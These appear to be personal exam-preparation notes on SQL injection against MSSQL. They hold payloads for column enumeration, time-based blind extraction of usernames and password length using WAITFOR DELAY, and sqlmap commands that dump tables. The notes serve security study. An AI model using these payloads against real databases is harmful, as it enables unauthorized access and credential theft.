#### References

- https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/
- https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
- https://medium.com/@notsoshant/a-not-so-blind-rce-with-sql-injection-13838026331e
- https://notchxor.github.io/oscp-notes/2-web/sqli/
- https://www.asciitable.com/

#### Blind SQL Injections

find columns names

```SQL
' HAVING 1=1 --
' GROUP BY table.column1 HAVING 1=1 --
' GROUP BY table.column1, column2 HAVING 1=1 --
' GROUP BY table.column1, column2, column3(n) HAVING 1=1 -- and so on
```

use the waiting time to determine whether the conditional equation is valid

```SQL
-- e.g. guess username (ASCII)
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 97) WAITFOR DELAY '00:00:05' --
'; IF (ASCII(lower(substring((select TOP 1 username from users), 1, 1))) > 98) WAITFOR DELAY '00:00:05' -- and so on

-- e.g. confirm username is correct
'; IF (substring((select TOP 1 username from users), 1, 5) = 'admin') WAITFOR DELAY '00:00:05'--
```

```SQL
-- check column length
'; IF (select LEN(password) from users) = 64 WAITFOR DELAY '00:00:05' --
```

#### sqlmap (:radioactive::radioactive::radioactive: cannot be used in the exam)

```
sqlmap -u "url" --dump -C "columns" -T "tables" -D "database" 
sqlmap -r post.txt --dump -C "columns" -T "tables" -D "database"
```

post.txt = request contents

![SQLi_2022 02 28_19h37m55s_001](https://user-images.githubusercontent.com/8998412/155977929-7e38d3bb-8d61-4afa-af6b-90ae1e13ec73.png)

